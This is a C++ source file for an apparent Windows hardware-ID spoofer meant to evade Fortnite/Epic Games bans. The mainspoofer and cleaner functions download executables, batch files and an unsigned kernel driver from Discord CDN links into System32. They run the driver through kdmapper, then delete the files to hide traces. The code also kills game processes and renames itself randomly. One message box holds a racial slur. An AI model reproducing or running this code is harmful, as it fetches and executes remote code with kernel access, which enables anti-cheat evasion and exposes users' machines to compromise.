#include <iostream>
#include <windows.h>
#include <string>
#include <random>
#include <wininet.h>
#include <fstream>
#include <cstdio>
#include <stdlib.h>  
#include <gdiplus.h>
#include <Winternl.h>
#include <Iphlpapi.h>
#include <winnt.h>
#include <tlhelp32.h>
#include <time.h>
#include <vector>
#include <debugapi.h>
#include <shlwapi.h>
#include <conio.h>
#include <CommCtrl.h>
#include <mmsystem.h>
#include <tchar.h>
#include <comdef.h>

#include "xor.h"
#include "print.h"

#pragma comment(lib, "urlmon.lib")
#pragma warning(disable : 2001)

# if defined(_MSC_VER)
# ifndef _CRT_SECURE_NO_DEPRECATE
# define _CRT_SECURE_NO_DEPRECATE (1)
# endif
# pragma warning(disable : 4996)
# endif

using namespace std;

std::string pastedshit(size_t length)
{
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

void randomtitleshit(char* sStr, unsigned int iLen)
{

	char Syms[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	unsigned int Ind = 0;
	srand(time(NULL) + rand());
	while (Ind < iLen)
	{
		sStr[Ind++] = Syms[rand() % 62];
	}
	sStr[iLen] = '\0';

}


void EnableDebugPriv()
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);

	CloseHandle(hToken);
}

void epicgames() /// if epic games process is up, it will kill it without shity taskkill line
{
	EnableDebugPriv();

	PROCESSENTRY32 entryv;
	entryv.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshothj = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshothj, &entryv) == TRUE)
	{
		while (Process32Next(snapshothj, &entryv) == TRUE)
		{
			if (stricmp(entryv.szExeFile, "EpicGamesLauncher.exe") == 0)
			{
				HANDLE hProcessbb = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entryv.th32ProcessID);

				Sleep(100);

				system("TASKKILL /F /IM EpicGamesLauncher.exe >NUL 2> 1");

				print::set_warning(xor ("\n  [-] Closed Epic Games\n"));


				Sleep(100);

				CloseHandle(hProcessbb);
			}
		}
	}
	CloseHandle(snapshothj);
}

void unrealcefsub()  /// if uncrealcefsub process is up, it will kill it without shity taskkill line
{
	EnableDebugPriv();

	PROCESSENTRY32 entryvb;
	entryvb.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshothjbn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshothjbn, &entryvb) == TRUE)
	{
		while (Process32Next(snapshothjbn, &entryvb) == TRUE)
		{
			if (stricmp(entryvb.szExeFile, "UnrealCEFSubProcess.exe") == 0)
			{
				HANDLE hProcessbbb = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entryvb.th32ProcessID);

				Sleep(100);

				system("TASKKILL /F /IM UnrealCEFSubProcess.exe >NUL 2> 1");

				print::set_warning(xor ("\n  [-] Closed UnrealCEFSub\n"));

				Sleep(100);

				CloseHandle(hProcessbbb);
			}
		}
	}
	CloseHandle(snapshothjbn);
}

void fortniteprocess()  /// if fortnite process is up, it will kill it without shity taskkill line
{
	EnableDebugPriv();

	PROCESSENTRY32 entryvbb;
	entryvbb.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshothjbb = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshothjbb, &entryvbb) == TRUE)
	{
		while (Process32Next(snapshothjbb, &entryvbb) == TRUE)
		{
			if (stricmp(entryvbb.szExeFile, "FortniteClient-Win64-Shipping.exe.exe") == 0)
			{
				HANDLE hProcessbbbb = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entryvbb.th32ProcessID);

				Sleep(100);

				system("TASKKILL /F /IM FortniteClient-Win64-Shipping.exe >NUL 2> 1");

				print::set_warning(xor ("\n  [-] Closed FortniteClient\n"));

				Sleep(100);

				CloseHandle(hProcessbbbb);
			}
		}
	}
	CloseHandle(snapshothjbb);
}

std::string path()  /// path of exe
{
	char shitter[_MAX_PATH];
	GetModuleFileNameA(NULL, shitter, _MAX_PATH);
	return std::string(shitter);
}

void asciitext() /// asciitext + time/build
{

	std::string builddate = __DATE__; /// date build
	std::string buildtime = __TIME__; /// time build
	/// usage: (kek.c_str) /// std::string kek = "civbreak.club | 1.0.0.0 | | " + builddate + " | screenshotted#1246"; /// old fortnite paste shiit video lmaooo ggg 

	std::cout << R"(

   _____                       ______ _   _    _____                    __          
  / ____|                     |  ____| \ | |  / ____|                  / _|         
 | (___   __ _ _ __ ___  _   _| |__  |  \| | | (___  _ __   ___   ___ | |_ ___ _ __ 
  \___ \ / _` | '_ ` _ \| | | |  __| | . ` |  \___ \| '_ \ / _ \ / _ \|  _/ _ \ '__|
  ____) | (_| | | | | | | |_| | |    | |\  |  ____) | |_) | (_) | (_) | ||  __/ |   
 |_____/ \__,_|_| |_| |_|\__,_|_|    |_| \_| |_____/| .__/ \___/ \___/|_| \___|_|   
                                                    | |                             
                                                    |_|           

            (working on windows 10 and windows 11 all winver)                 shit by !Samu#1337)" << '\n';


}

void checkprivileges() { /// check admin

	bool IsRunningAsAdmin = false;

	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	IsRunningAsAdmin = fRet;

	if (!IsRunningAsAdmin) {

		int msgboxID = MessageBoxA(
			NULL,
			(LPCSTR)"run as admin nigga.",
			(LPCSTR)"XkdKLEQsHA9tUbzA",
			MB_OK
		);
		exit(-1);


	}
}

void mainspoofer()
{
	HRESULT hr;
	LPCTSTR Url = _T("https://cdn.discordapp.com/attachments/955179230923206656/964814122548076614/kdmapper.exe"), File = _T("C:\\Windows\\System32\\kdmapper.exe");
	hr = URLDownloadToFile(0, Url, File, 0, 0);

	HRESULT hrb;
	LPCTSTR Urlb = _T("https://cdn.discordapp.com/attachments/955179230923206656/964814107536654336/samudrvprivate.sys"), Fileb = _T("C:\\Windows\\System32\\drvsamu.sys");
	hrb = URLDownloadToFile(0, Urlb, Fileb, 0, 0);

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi;
	system("C:\\Windows\\System32\\kdmapper.exe C:\\Windows\\System32\\drvsamu.sys");
}

void cleaner()
{
	HRESULT hr1;
	LPCTSTR Url1 = _T("https://cdn.discordapp.com/attachments/955179230923206656/964816674404573204/AppleCleaner.exe"), Filec = _T("C:\\Windows\\System32\\apple.exe");
	hr1 = URLDownloadToFile(0, Url1, Filec, 0, 0);

	HRESULT hrb1;
	LPCTSTR Urlbc = _T("https://cdn.discordapp.com/attachments/940653482669666384/957027474305351801/mac.bat"), Filed = _T("C:\\Windows\\System32\\mac.bat");
	hrb1 = URLDownloadToFile(0, Urlbc, Filed, 0, 0);

	HRESULT hrbd;
	LPCTSTR Urlbca = _T("https://cdn.discordapp.com/attachments/940653482669666384/957308827018084382/Deep.bat"), Files = _T("C:\\Windows\\System32\\deep.bat");
	hrbd = URLDownloadToFile(0, Urlbca, Files, 0, 0);

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi;
	system("C:\\Windows\\System32\\apple.exe");
	Sleep(200);
	system("C:\\Windows\\System32\\deep.bat");
	Sleep(100);
	system("C:\\Windows\\System32\\mac.bat");
}

/// for other shitty features go to features.h

int main() /// main lets gooo
{

	/// use auth.gg or some free shit use here, i maked it free so no auth is here.

	char title[100];

	print::set_warning(xor ("\n\n  I"));
	Sleep(50);
	print::set_warning(xor ("N"));
	Sleep(50);
	print::set_warning(xor ("F"));
	Sleep(50);
	print::set_warning(xor ("O"));
	Sleep(50);
	print::set_warning(xor (":"));
	Sleep(50);
	print::set_warning(xor (" H"));
	Sleep(50);
	print::set_warning(xor ("i"));
	Sleep(50);
	print::set_warning(xor (" M"));
	Sleep(50);
	print::set_warning(xor ("o"));
	Sleep(50);
	print::set_warning(xor ("n"));
	Sleep(50);
	print::set_warning(xor ("k"));
	Sleep(50);
	print::set_warning(xor ("e"));
	Sleep(50);
	print::set_warning(xor ("y"));
	Sleep(50);
	print::set_warning(xor ("s"));
	Sleep(50);
	print::set_warning(xor (".\n"));
	Sleep(1000);

	fortniteprocess();
	unrealcefsub();
	epicgames();

	randomtitleshit(title, 16);
	SetConsoleTitleA(title);

	Sleep(100);

	std::string name = pastedshit(8) + ".exe";
	std::rename(path().c_str(), name.c_str());

	checkprivileges();

	Sleep(1000);

	system("cls");

	asciitext();
	print::set_warning(xor ("\n\n  [+] press some key to spoof\n")); /// you can add cleaner its ez asffffffffffffffffffffffffffffff
	getch();

Sleep(583);

	print::set_warning(xor ("\n  [+] spoofing, wait\n"));

	Sleep(583);

	mainspoofer();

	Sleep(800);

	cleaner();

	Sleep(583);

	print::set_ok (xor ("\n  [+] spoofed as well,please check your serial...\n"));

	Sleep(25);

	std::remove("C:\\Windows\\System32\\kdmapper.exe");
	std::remove("C:\\Windows\\System32\\drvsamu.sys");
	std::remove("C:\\Windows\\System32\\apple.exe");
	std::remove("C:\\Windows\\System32\\deep.bat");
	std::remove("C:\\Windows\\System32\\mac.bat");

	Sleep(4305);

	return 0;
}
